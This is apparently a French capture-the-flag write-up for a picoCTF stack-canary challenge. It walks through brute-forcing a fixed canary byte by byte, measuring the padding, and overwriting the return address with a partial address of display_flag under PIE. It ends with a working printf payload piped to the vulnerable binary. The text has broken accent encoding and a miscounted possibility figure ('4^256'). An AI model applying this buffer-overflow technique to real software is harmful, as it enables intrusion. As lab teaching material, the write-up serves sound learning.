0x00005555555553dd <+202>:	call   0x5555555550a0 <memcmp@plt>
entre 0x5555555580a9 (original canary) et $rdi

Puisque le stack cookie est toujours, le mÃme, il est possible de le bruteforcer petit-a-petit, lettres par lettres.
La taille du canary est de 4 bytes. Puisque celui-ci est lu dans un fichier, le canary est composÃ© de caractÃres ascii.
Soit un total de 4^256 possibilitÃ©s

Pour optimiser le bruteforce, attaquons les bytes du canary uns-par-uns.
1) Padding
Avant d'attaquer le canary, trouvons la taille du buffer a remplir avant d'Ã©craser le canarie:
buffer: ----------------------------[canary] -> a vide
buffer: AAAAAAAAAAAAAAAAAAA---------[canary] -> input x
buffer: AAAAAAAAAAAAAAAAAAAAAAAAA---[canary] -> input x+1
buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAny] -> Stack smashing protection!

2) Bruteforce
Dans notre cas, le buffer est long de 32bytes avant d'Ãcraser le canarie
Puis, caracteres par caracteres, il suffit de tester le canarie, jusqu'a ne plus obtenir le message "Stack smashing":
buffer: AAAA|ZYXW <- canary
buffer: AAAA A    <- Stack smashing
buffer: AAAA B    <- Stack smashing
[...]
buffer: AAAA Z    <- ok

Et ainsi de suite pour les autres bytes du canarie.

3) JMP to win
AprÃ¨s avoir trouvÃ©la valeur du canary, il suffit de dÃterminer le pading a ajouter pour Ãcraser EIP.
Ici, ce sera 16 bytes. Payload= [pad*32] + [canary] + [pad*16] [EIP]
EIP doit pointer sur la fonction "display_flag".
Mais la PIE est activÃe. Nous avons juste la base de l'adresse de la fonction.
gdb, info function [...]
0x000007ed  display_flag

Set EIP a cette adresse, et spam la machine en boucle jusqu'a ce que les adresses soient les mÃmes:

[root@Arch Canary]# printf "100\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAW3sHAAAAAAAAAAAAAAAA\xed\x07" | ./vuln
Please enter the length of the entry:
> Input> Ok... Now Where's the Flag?
picoCTF{flag local}

similar challenge, greate pwntools tips :
https://www.youtube.com/watch?v=soA3YirTy1s&t=380s
